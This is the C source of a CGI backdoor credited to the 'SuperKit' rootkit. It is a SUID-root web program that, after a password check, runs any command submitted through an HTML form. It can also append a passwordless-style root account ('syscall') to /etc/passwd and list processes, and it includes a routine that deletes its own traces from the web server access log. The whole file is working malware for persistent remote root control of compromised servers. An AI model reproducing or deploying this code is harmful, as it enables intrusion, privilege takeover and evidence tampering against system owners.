// CGI Backdoor - modified and adapted for SuperKit by mostarac <mostar@hotmail.com>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "../include/cgiconf.h"
#include "../include/config.h"

#define NOBODY_ID 99
#define NOBODY_GID 99

typedef struct _pid {
char pid[10];
struct _pid *next;
} *pid;

#ifdef O_LOGS
void dologs(char *str,char *remoteaddr)
{
FILE *logs;
time_t t;
char *date;
if (str==NULL || remoteaddr==NULL) return;
logs=(FILE *) fopen(LOGFILE,"a");
if (logs==NULL) return;
date=malloc(256);
time(&t);
strftime(date,255,"%a %b %d %T %Z %Y",localtime(&t));
fprintf(logs,"%s: FROM:%s > %s\n",date,remoteaddr,str);
}
#endif

char *getaddress()
{
  char *content;
  char *address;
content = (char *) malloc (atoi (getenv ("CONTENT_LENGTH")) + 2);
read (0, content, atoi (getenv ("CONTENT_LENGTH")));
address = (char *) malloc (sizeof(char)*(strlen(content)-15));
address=strstr(content,"ADDRESS=")+8;
if (address!=NULL) 
	address[strlen(address)-1]='\0';
return(address);
}

char x2c(char *what)
{
  register char digit;
          
  digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
  digit *= 16;
  digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
  return (digit);
}


void dellog(char *cgifile)
{
char *buffer;
buffer=malloc(255*(sizeof(char)));
/******* it's easier with awk       :)  ****/
snprintf(buffer, 250,"awk '$0 !~ /%s/ { print }' %s > %s/access_new",cgifile, HTTPDLOG, HTTPDLOGDIR);
system(buffer);
free(buffer);
buffer=malloc(255*(sizeof(char)));
snprintf(buffer,250 ,"/bin/mv -f %s/access_new %s; /bin/rm -f %s/access_new", HTTPDLOGDIR, HTTPDLOG, HTTPDLOGDIR);
system(buffer);
}

void executa(char *s)
{
FILE *out;
int c = 0, f = 0;
if (s==NULL)
  {
  printf("OV: Invalid command");
  return;
  }
if(strstr(s,"/ps"))
	{
	printf("\nDue to suExec in apache, any ps command must be done with  httpd id and gid\n");
	setuid(NOBODY_ID);
	setgid(NOBODY_GID);
	}
out = popen(s, "r");
if (out != NULL)
{
while (c != EOF)
	{
	c = fgetc(out);
	if (c != EOF && c != '\0')
		{
		
		printf("%c", (char) c);
		f++;
		}
	}
pclose(out);
}
setuid(0);
setgid(0);
}

int
main (int argc, char *argv[])
{
  char *content;
  char *strcmd;
  char *address;
  char *ptr;
  char *ptr2;
  char *temp,*tmp;
  struct hostent *serverinfo;
  FILE *out;
  int f=0,c=0,i, tt;
  char *remoteaddr;
  pid pd_start=NULL, pd_end=NULL,pd_temp=NULL;
#ifdef O_LOGS  
  remoteaddr= getenv("REMOTE_ADDR");
#endif
  setbuf (stdout, NULL);
  if ((argc == 1) && (strcmp (getenv ("REQUEST_METHOD"), "GET") == 0))
    {
printf ("Content-type: text/html\n\n");
printf("<ISINDEX PROMPT=\"Username:\">");
//dellog(argv[0]);
exit(0);
}
if ((argc == 2)&&(strcmp (getenv ("REQUEST_METHOD"), "GET") == 0)&&(strcmp((char *)crypt(argv[1],"SK"),PASSWORD)!=0)){
printf ("Content-type: text/plain\n\n");
printf("Username not found or config file unset!");
#ifdef O_LOGS
 dologs("Wrong username",remoteaddr);
#endif
//dellog(argv[0]);
exit(0);
}
      if ((argc == 2)&&(strcmp (getenv ("REQUEST_METHOD"), "GET") == 0)&&(strcmp((char *)crypt(argv[1],"SK"),PASSWORD)==0))
      {
      printf ("Content-type: text/html\n\n");
      printf("<TITLE>CGI SuperUser Gateway by Mos Tarac &#60;mostar@hotmail.com&#62;</TITLE>");
      printf ("<FORM ACTION=%s METHOD=POST>\n", getenv ("SCRIPT_NAME"));
      printf ("<SELECT NAME=STRCMD>\n");
      printf ("<OPTION>execute command:\n");
      printf ("<OPTION>create new root account\n");
      printf ("<OPTION>list all processes\n");
      printf ("</SELECT>\n");
      printf ("Address/Command:<INPUT TYPE=TEXT NAME=ADDRESS>\n");
      printf ("<BR><INPUT TYPE=submit VALUE=\"Execute..\">\n");
      printf ("<BR><BR>Users connected:<BR>\n");
      printf ("<PRE>\n");
      executa(WHO);
      printf ("\n\n</PRE>\n");
      //dellog(argv[0]);
      exit (0);
      }
printf ("Content-type: text/plain\n\n");
if (geteuid ())
	{
	printf ("This CGI must be SUID root!\n Please check logs!");
	exit (0);
	}
content = (char *) malloc (atoi (getenv ("CONTENT_LENGTH")) + 2);
read (0, content, atoi (getenv ("CONTENT_LENGTH")));
content[strlen (content)] = '&';
ptr = strstr (content, "STRCMD=") + 5;
ptr2 = strstr (content, "&");
strcmd = (char *) malloc (ptr2 - ptr + 1);
strncpy (strcmd, ptr, ptr2 - ptr);
ptr = strstr (ptr, "ADDRESS=") + 8;
ptr2 = strstr (ptr, "&");

  executa(WHO);
  free (content);
  dup2 (1, 2);
  tmp = &strcmd[2];
  strcmd = tmp;
  if (!strcmp (strcmd, "list+all+processes"))
    {
      temp = (char *) malloc (11 + strlen (PS));
      sprintf (temp, "%s -axu", PS);
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: Error in executing ps!",remoteaddr);
#endif
	printf ("OV: Error in executing ps!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: Processlist done!!..",remoteaddr);
#endif
 	printf ("--------------------------------------------------------------------------\n");
	printf ("OV: Process list (ps -axu)\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "create+new+root+account"))
    {
      temp = malloc(200);
      sprintf (temp, "echo 'syscall:%s:0:0::/root:/bin/bash' >> /etc/passwd ",PASSWORD);
      if (system (temp) != 0)
	{
#ifdef O_LOGS
 dologs("OV: New Root Account failed!",remoteaddr);
#endif
 	printf ("--------------------------------------------------------------------------\n");
        printf ("New Root Account failed!\n");
	}
      else
	{
#ifdef O_LOGS
 dologs("OV: New root account created as user:  syscall !!",remoteaddr);
#endif
 	printf ("--------------------------------------------------------------------------\n");
        printf ("New root account created as user:  syscall : with your rootkit password !!\n");
	}
      free (temp);
    }
  if (!strcmp (strcmd, "execute+command%3A"))
    {
	if (!(ptr2 - ptr))
  {
   printf ("--------------------------------------------------------------------------\n");
   printf ("OV: A command must be specified!");
   //dellog(argv[0]);
   exit (0);
  }
content = (char *) malloc (atoi (getenv ("CONTENT_LENGTH")) + 2);
read (0, content, atoi (getenv ("CONTENT_LENGTH")));
address = (char *) malloc (sizeof(char)*(strlen(content)-15));
address=strstr(content,"ADDRESS=")+8;
if (address!=NULL) 
	address[strlen(address)-1]='\0';
for (tt = 0, i = 0; address[i]; tt++, i++) {
	if ((address[tt] = address[i]) == '%') {
		address[tt] = x2c(&address[i + 1]);
		i += 2;
		}
	}
address[tt] = '\0';
printf ("--------------------------------------------------------------------------\n");
for (tt = 0; address[tt]; tt++) {
	if (address[tt] == '+') {
		address[tt] = ' ';
	}
}

#ifdef O_LOGS
 temp=malloc(sizeof(char) * 60);
 sprintf(temp,"OV: execute: %s",address);
 dologs(temp,remoteaddr);
#endif
	executa(address);
    }
  //dellog(argv[0]);
  exit (0);
}
